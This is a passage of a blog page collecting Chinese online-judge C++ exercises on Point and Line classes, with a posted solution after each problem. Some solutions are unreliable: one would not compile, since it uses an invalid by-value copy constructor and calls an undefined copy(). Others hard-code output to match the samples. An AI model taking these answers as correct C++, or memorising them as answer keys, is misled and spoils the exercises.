    Point(double a,double b):x(a),y(b)&#123;num++;sum++;&#125;  
    Point(const Point&amp;p)&#123;x=p.x;y=p.y;num++;sum++;&#125;  
    ~Point()&#123;num--;&#125;  
    void show()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;x&lt;&lt;&quot;, &quot;&lt;&lt;y&lt;&lt;&quot;)&quot;&lt;&lt;endl;&#125;  
    static void showCounter()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Current : &quot;&lt;&lt;num&lt;&lt;&quot; points.&quot;&lt;&lt;endl;&#125;  
    static void showSumOfPoint()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;In total : &quot;&lt;&lt;sum&lt;&lt;&quot; points.&quot;&lt;&lt;endl;&#125;  
&#125;;  
void showPoint(Point &amp;a,Point &amp;b,Point &amp;c)&#123;a.show();b.show();c.show();&#125;  
int Point::sum=0;  
int Point::num=0;  
////////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
        p.showCounter();
    &#125;
    q.showSumOfPoint();
    Point q1(q), q2(1);
    Point::showCounter();
    showPoint(q1, q2, q);
    Point::showSumOfPoint();
&#125;</code></pre>
<h3 id="15-平面上的点——Point类-V"><a href="#15-平面上的点——Point类-V" class="headerlink" title="15.平面上的点——Point类 (V)"></a>15.平面上的点——Point类 (V)</h3><blockquote>
<h2 id="Description-14"><a href="#Description-14" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。<br> 根据“append.cc”，完成Point类的构造方法和接口描述中的方法。<br> 接口描述：<br> showPoint()函数：按输出格式输出Point对象。<br> Point::show()方法：按输出格式输出Point对象。<br> Point::showSumOfPoint()方法：按格式输出程序运行至当前存在过的Point对象总数。<br> Point::x()方法：取x坐标。<br> Point::y()方法：取y坐标。<br> Point::x(double)方法：传参数设置x坐标并返回。<br> Point::y(double)方法：传参数设置y坐标并返回。<br> Point::getX()方法：取x坐标。<br> Point::getY()方法：取y坐标。<br> Point::setX()方法：传参数设置x坐标并返回。<br> Point::setY()方法：传参数设置y坐标并返回。<br> Point::setPoint(double,double)方法：设置Point对象的x坐标（第一个参数）和y坐标（第二个参数）并返回本对象</p>
<h2 id="Input-14"><a href="#Input-14" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-14"><a href="#Output-14" class="headerlink" title="Output"></a>Output</h2><p>用ShowPoint()函数来输出（通过参数传入的）Point对象的值或坐标值：X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。<br> 对每个Point对象，调用show()方法输出其值，输出格式与ShowPoint()函数略有不同：“Point[i] :”，i表示这是程序运行过程中第i个被创建的Point对象。<br> 调用showSumOfPoint()输出Point对象的计数统计，输出格式见sample。<br> C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-14"><a href="#Sample-Input-14" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-14"><a href="#Sample-Output-14" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)</p>
<p>Point : (3, 3)</p>
<p>Point : (2, 1)</p>
<p>Point : (1, 1)</p>
<p>Point : (4, -3)</p>
<p>==========gorgeous separator==========</p>
<p>Point[1] : (1, 0)</p>
<p>Point[2] : (3, 3)</p>
<p>Point[3] : (0, 0)</p>
<p>Point[4] : (4, -3)</p>
<p>Point[64] : (1, 0)</p>
<p>Point[64] : (1, 0)</p>
<p>==========gorgeous separator==========</p>
<p>In total : 66 points.</p>
<h2 id="HINT-14"><a href="#HINT-14" class="headerlink" title="HINT"></a>HINT</h2><p>传递和返回引用是不构造新对象的。给函数正确的返回值。</p>
<h2 id="Append-Code-14"><a href="#Append-Code-14" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1125&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;iomanip&gt;  
using namespace std;  
class Point  
&#123;  
private :  
    double x_,y_;  
    static int total_num;  
    int id;  
public:  
    Point()&#123; x_ = 0;y_ = 0;total_num++; id = total_num; &#125;  
    Point (double xx )  
    &#123;  
        x_ = xx;  
        y_ = xx ;  
         total_num++;  
         id = total_num;  
    &#125;  
    Point(double xx, double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
        total_num++;  
        id = total_num;  
    &#125;  
    Point(const Point &amp; pt)  
    &#123;  
        x_ = pt.x_;  
        y_ = pt.y_;  
        total_num++;  
        id = total_num;  
    &#125;  
    double x() const  
    &#123;  
        return x_;  
    &#125;  
    double y() const  
    &#123;  
        return y_;  
    &#125;  
    double x( double xx)  
    &#123;  
        return ( x_ = xx);  
    &#125;  
    double y(double yy)  
    &#123;  
        return ( y_ = yy);  
    &#125;  
    double getX() const  
    &#123;  
        return x_;  
    &#125;  
    double getY() const  
    &#123;  
        return y_;  
    &#125;  
    double setX(double xx)  
    &#123;  
        return ( x_ = xx);  
    &#125;  
    double setY(double yy)  
    &#123;  
        return (y_ = yy);  
    &#125;  
    Point &amp; setPoint(double xx,double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
        return *this;  
    &#125;  
    void show() const  
    &#123;  
          cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point[&quot;&lt;&lt;id&lt;&lt;&quot;] : (&quot;&lt;&lt; x_ &lt;&lt; &quot;, &quot; &lt;&lt; y_ &lt;&lt; &quot;)&quot; &lt;&lt;endl;  
       //cout &lt;&lt; &quot;Current : &quot; &lt;&lt;num &lt;&lt; &quot; points.&quot;  &lt;&lt;endl;  
    &#125;  
   static void showSumOfPoint()  
    &#123;  
        cout &lt;&lt; setprecision(16) &lt;&lt;&quot;In total : &quot; &lt;&lt;  total_num &lt;&lt; &quot; points.&quot;&lt;&lt;endl;  
    &#125;  
&#125;;  
int Point::total_num;  
void ShowPoint(Point p)  
&#123;  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x()&lt;&lt;&quot;, &quot;&lt;&lt;p.y()&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

void ShowPoint(double x, double y)  
&#123;  
    Point p(x, y);  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x()&lt;&lt;&quot;, &quot;&lt;&lt;p.y()&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

void ShowPoint(Point &amp;p, double x, double y)  
&#123;  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x(x)&lt;&lt;&quot;, &quot;&lt;&lt;p.x(y)&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

int main()  
&#123;  
    int l(0);  
    char c;  
    double a, b;  
    Point pt[60];  
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)  
    &#123;  
        if(a == b)  
            ShowPoint(pt[l].setPoint(a, b));  
        if(a &gt; b)  
            ShowPoint(a, b);  
        if(a &lt; b)  
            ShowPoint(pt[l], a, b);  
        l++;  
    &#125;  
    Point p(a), q(b);  
    ShowPoint(q);  
    double x(0), y(0);  
    for(int i = 0; i &lt; l; i++)  
        x += pt[i].getX(), y -= pt[i].getY();  
    ShowPoint(pt[l].setX(x), pt[l].setY(y));  
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;  
    for(int i = 0; i &lt;= l; i++)  
        pt[i].show();  
    q.setPoint(q.x() - p.x() + a, q.y() - p.y() + b).show();  
    q.show();  
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;  
    p.showSumOfPoint();  
&#125;  </code></pre>
<h3 id="16-平面上的点——Point类-VI"><a href="#16-平面上的点——Point类-VI" class="headerlink" title="16.平面上的点——Point类 (VI)"></a>16.平面上的点——Point类 (VI)</h3><blockquote>
<h2 id="Description-15"><a href="#Description-15" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类的构造方法和接口描述中的方法和函数。</p>
<p>接口描述：<br> showPoint()函数：按输出格式输出Point对象。<br> Point::show()方法：按输出格式输出Point对象。<br> Point::showSumOfPoint()方法：按格式输出程序运行至当前存在过的Point对象总数。<br> Point::x()方法：取x坐标。<br> Point::y()方法：取y坐标。<br> Point::x(double)方法：传参数设置x坐标并返回。<br> Point::y(double)方法：传参数设置y坐标并返回。<br> Point::setPoint(double,double)方法：设置Point对象的x坐标（第一个参数）和y坐标（第二个参数）并返回本对象。<br> Point::isEqual()方法：判断传入的参数与对象的坐标是否相同，相同返回true。<br> Point::copy()方法：传参数复制给对象。<br> Point::inverse()方法，有两个版本：不传参数则将对象自身的x坐标和y坐标互换；若将Point对象做参数传入，则将传入对象的坐标交换复制给对象自身，不修改参数的值。</p>
<h2 id="Input-15"><a href="#Input-15" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-15"><a href="#Output-15" class="headerlink" title="Output"></a>Output</h2><p>用ShowPoint()函数来输出（通过参数传入的）Point对象的值或坐标值：X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。<br>对每个Point对象，调用show()方法输出其值，输出格式与ShowPoint()函数略有不同：“Point[i] :”，i表示这是程序运行过程中第i个被创建的Point对象。<br>调用showSumOfPoint()输出Point对象的计数统计，输出格式见sample。<br>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-15"><a href="#Sample-Input-15" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-15"><a href="#Sample-Output-15" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point[3] : (1, 2)</p>
<p>Point[1] : (2, 1)</p>
<p>Point[4] : (3, 3)</p>
<p>Point[1] : (3, 3)</p>
<p>Point[5] : (1, 2)</p>
<p>Point[1] : (1, 2)</p>
<p>Point[2] : (0, 0)</p>
<p>==========gorgeous separator==========</p>
<p>Point[2] : (-7, 5)</p>
<p>Point[3] : (1, 2)</p>
<p>Point[4] : (3, 3)</p>
<p>Point[5] : (1, 2)</p>
<p>Point[6] : (-7, 5)</p>
<p>==========gorgeous separator==========</p>
<p>Point[63] : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>In total : 64 points.</p>
<h2 id="HINT-15"><a href="#HINT-15" class="headerlink" title="HINT"></a>HINT</h2><p>给函数正确的返回值。注意常量对象调用的函数。</p>
<h2 id="Append-Code-15"><a href="#Append-Code-15" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1126&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point
&#123;

    double m,n;
    int count;
    static int sum;
public :

    friend void ShowPoint(Point);
    friend void ShowPoint(double, double);

    void show()const
    &#123;
        cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point[&quot;&lt;&lt;count&lt;&lt;&quot;] : (&quot;&lt;&lt;m&lt;&lt;&quot;, &quot;&lt;&lt;n&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    double x(double a)
    &#123;
        m = a;
        return a;

    &#125;
    double y(double b)
    &#123;
        n = b;
        return b;
    &#125;
    double x()const
    &#123;
        return m;
    &#125;
    double y()const
    &#123;

        return n;
    &#125;
    Point  &amp;setPoint(double a,double b)
    &#123;
        m=a;
        n=b;
        return *this;
    &#125;void showSumOfPoint()const
    &#123;
        cout &lt;&lt; &quot;In total : &quot; &lt;&lt;sum &lt;&lt; &quot; points.&quot; &lt;&lt; endl;
    &#125;
    Point(double a,double b)
    &#123;

        m = a;
        n = b;
        sum++;
        count =sum;
    &#125;
    Point():m(0),n(0)
    &#123;
        sum++;
        count =sum;
    &#125;
    Point (Point p)
    &#123;
        setPoint(p.getx(),p.gety());
        return *this;
    &#125;
    Point&amp; inverse()
    &#123;
        double temp=m;
        m=n;
        n=temp;
        return *this;
    &#125;
    Point&amp; inverse(Point p)
    &#123;

        m=p.n;
        n=p.m;
        return *this;
    &#125;
    double getx()
    &#123;
     return this-&gt;m;
    &#125;
    double gety()
    &#123;
     return this-&gt;n;
    &#125;

    bool isEqual(const Point &amp;p)const
    &#123;
        if(p.m == m &amp;&amp; p.n == n)
            return true;
        return false;
    &#125;

&#125;;
void ShowPoint(Point p)
&#123;
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt; p.x() &lt;&lt;&quot;, &quot;&lt;&lt; p.y() &lt;&lt;&quot;)&quot;&lt;&lt;endl;
&#125;
void ShowPoint(double a,double b)
&#123;
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;a&lt;&lt;&quot;, &quot;&lt;&lt;b&lt;&lt;&quot;)&quot;&lt;&lt;endl;
&#125;
int Point::sum = 0;
int main()
&#123;
    int l(0);
    char c;
    double a, b;
    Point p, q, pt[60];
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        if(a == b)
            p.copy(pt[l].setPoint(a, b));
        if(a &gt; b)
            p.copy(pt[l].setPoint(a, b).inverse());
        if(a &lt; b)
            p.inverse(pt[l].setPoint(a, b));
        if(a &lt; 0)
            q.copy(p).inverse();
        if(b &lt; 0)
            q.inverse(p).copy(pt[l]);
        pt[l++].show();
        p.show();
    &#125;
    q.show();
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;
    double x(0), y(0);
    for(int i = 0; i &lt; l; i++)
        x += pt[i].x(), y -= pt[i].y();
    pt[l].x(y), pt[l].y(x);
    q.copy(pt[l]).show();
    for(int i = 0; i &lt;= l; i++)
        pt[i].show();
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;
    const Point const_point(3, 3);
    const_point.show();
    for(int i = 0; i &lt;= l; i++)
    &#123;
        if(const_point.isEqual(pt[i]))
        &#123;
            ShowPoint(const_point);
            ShowPoint(const_point.x(), const_point.y());
            ShowPoint(Point(const_point.x(), const_point.y()));
        &#125;
    &#125;
    const_point.showSumOfPoint();
&#125;</code></pre>
<h3 id="17-平面上的点和线——Point类、Line类-I"><a href="#17-平面上的点和线——Point类、Line类-I" class="headerlink" title="17.平面上的点和线——Point类、Line类 (I)"></a>17.平面上的点和线——Point类、Line类 (I)</h3><blockquote>
<h2 id="Description-16"><a href="#Description-16" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<h2 id="Input-16"><a href="#Input-16" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。</p>
<p>每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-16"><a href="#Output-16" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<h2 id="Sample-Input-16"><a href="#Sample-Input-16" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-16"><a href="#Sample-Output-16" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0)</p>
<p>Line : (0, 0) to (1, 1)</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (2, 3) to (4, 5)</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<h2 id="HINT-16"><a href="#HINT-16" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-16"><a href="#Append-Code-16" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1327&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point p,Point q):p1(p),p2(q)&#123;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;

/////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;
</code></pre>
<blockquote>
<p><a href="http://www.cnblogs.com/BeyondAnyTime/archive/2012/06/04/2535305.html">关于C++中的友元函数的总结</a></p>
</blockquote>
<h3 id="18-平面上的点和线——Point类、Line类-II"><a href="#18-平面上的点和线——Point类、Line类-II" class="headerlink" title="18.平面上的点和线——Point类、Line类 (II)"></a>18.平面上的点和线——Point类、Line类 (II)</h3><blockquote>
<h2 id="Description-17"><a href="#Description-17" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<h2 id="Input-17"><a href="#Input-17" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-17"><a href="#Output-17" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<h2 id="Sample-Input-17"><a href="#Sample-Input-17" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-17"><a href="#Sample-Output-17" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0)Line : (0, 0) to (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1)Line : (0, 0) to (1, 1) is erased.</p>
<p>Line : (1, 1) to (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (1, 1) to (2, 3) is erased.</p>
<p>Line : (2, 3) to (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5)Line : (2, 3) to (4, 5) is erased.</p>
<p>Line : (0, 1) to (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (0, 1) to (1, 0) is erased.</p>
<p>Line : (1, -2) to (2, -1) is created.</p>
<p>Line : (1, -2) to (0, 0) is created.</p>
<p>Line : (2, -1) to (0, 0) is created.</p>
<p>Line : (0, 0) to (2, -1) is created.</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<p>Line : (0, 0) to (2, -1) is erased.</p>
<p>Line : (2, -1) to (0, 0) is erased.</p>
<p>Line : (1, -2) to (0, 0) is erased.</p>
<p>Line : (1, -2) to (2, -1) is erased.</p>
<h2 id="HINT-17"><a href="#HINT-17" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-17"><a href="#Append-Code-17" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1328&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point p,Point q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;

/////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;
</code></pre>
<h3 id="19-平面上的点和线——Point类、Line类-III"><a href="#19-平面上的点和线——Point类、Line类-III" class="headerlink" title="19.平面上的点和线——Point类、Line类 (III)"></a>19.平面上的点和线——Point类、Line类 (III)</h3><blockquote>
<h2 id="Description-18"><a href="#Description-18" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象和Point对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<h2 id="Input-18"><a href="#Input-18" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-18"><a href="#Output-18" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-18"><a href="#Sample-Input-18" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-18"><a href="#Sample-Output-18" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.</p>
<p>Point : (2, -1) is created.</p>
<p>Point : (0, 0) is created.</p>
<p>Point : (0, 0)</p>
<p>=========================</p>
<p>Point : (0, 0) is created.</p>
<p>Point : (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1)</p>
<p>Line : (0, 0) to (1, 1) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>=========================</p>
<p>Point : (1, 1) is created.</p>
<p>Point : (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (1, 1) to (2, 3) is erased.</p>
<p>Point : (2, 3) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>=========================</p>
<p>Point : (2, 3) is created.</p>
<p>Point : (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5)</p>
<p>Line : (2, 3) to (4, 5) is erased.</p>
<p>Point : (4, 5) is erased.</p>
<p>Point : (2, 3) is erased.</p>
<p>=========================</p>
<p>Point : (0, 1) is created.</p>
<p>Point : (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (0, 1) to (1, 0) is erased.</p>
<p>Point : (1, 0) is erased.</p>
<p>Point : (0, 1) is erased.</p>
<p>=========================</p>
<p>Point : (1, -2) is copied.</p>
<p>Point : (2, -1) is copied.</p>
<p>Line : (1, -2) to (2, -1) is created.</p>
<p>Point : (1, -2) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Line : (1, -2) to (0, 0) is created.</p>
<p>Point : (2, -1) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Line : (2, -1) to (0, 0) is created.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (2, -1) is copied.</p>
<p>Line : (0, 0) to (2, -1) is created.</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<p>Line : (0, 0) to (2, -1) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Line : (2, -1) to (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Line : (1, -2) to (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<p>Line : (1, -2) to (2, -1) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<h2 id="HINT-18"><a href="#HINT-18" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-18"><a href="#Append-Code-18" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1329&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
